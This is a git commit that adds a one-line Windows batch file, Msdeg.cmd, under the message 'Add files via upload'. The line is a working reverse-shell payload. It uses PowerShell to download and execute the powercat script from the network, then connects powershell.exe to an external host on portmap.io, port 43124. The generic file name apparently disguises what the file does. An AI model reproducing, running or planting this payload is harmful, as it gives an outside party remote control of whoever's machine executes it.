8626c2e69d932eb8cfc48bb71ec98662a0a62dc0
walid-XD <77286857+walid-XD@users.noreply.github.com>
2022-03-22 22:26:26 +0100

    Add files via upload

---
+++ Msdeg.cmd
@@ -0,0 +1,1 @@
+powershell -c IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c FHETUV89TSS-43124.portmap.io -p 43124 -e powershell.exe"
